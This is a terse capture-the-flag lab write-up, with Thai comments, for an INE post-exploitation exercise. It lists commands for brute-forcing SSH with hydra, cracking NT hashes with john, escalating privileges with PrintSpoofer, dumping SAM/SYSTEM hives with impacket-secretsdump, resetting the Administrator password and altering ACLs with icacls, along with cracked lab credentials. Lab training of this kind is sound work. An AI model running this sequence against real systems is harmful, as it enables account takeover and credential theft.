Host & Network Penetration Testing: Post-Exploitation CTF 2

`hydra -l alice -P password.txt ssh://target.ine.local`
alice princess1

`ssh alice@target.ine.local`
`sftp alice@target.ine.local`

`get password_dump.txt`

`john --format=NT password_dump.txt`
ได้ david orange มาตัวเดียว 

หลังใช้ PrintSpoofer ที่โจทย์กำหนดเข้ามาได้
`reg save HKLM\SAM sam.bak`
`reg save HKLM\SYSTEM system.bak`
`impacket-secretsdump -sam sam.bak -system system.bak LOCAL`

`net user Administrator password` 
จริงๆมีสิทธิ admin  ไปเปลี่ยน pass เลยก็ได้

`icacls flag`
`icacls flag /remove:d "NT AUTHORITY\SYSTEM"`
หรือไปเซทสิทธิ